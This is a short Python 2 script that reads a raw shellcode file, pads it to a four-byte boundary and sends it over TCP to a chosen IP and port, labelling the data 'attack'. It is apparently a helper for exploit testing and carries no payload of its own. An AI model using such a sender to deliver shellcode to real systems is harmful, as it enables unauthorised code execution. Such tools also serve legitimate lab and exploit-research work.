#!/usr/local/bin/python
import sys
import os
import socket
import struct

#
if( len(sys.argv) != 4):
	print "Usage: %s IP PORT RAW_SHELLCODE\n" % (sys.argv[1])
	sys.exit(-1)

#read in shellcode, and adjust size if required
file = file(sys.argv[3], "r")
SC = file.read()
Mod = len(SC) % 4
if (Mod > 0):
	adjust = 4 - Mod
	SC += "B" * adjust

#connect to server
fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
fd.connect( (sys.argv[1], int(sys.argv[2])) )

attack = SC
fd.sendall(attack)
print "Sent: " + attack
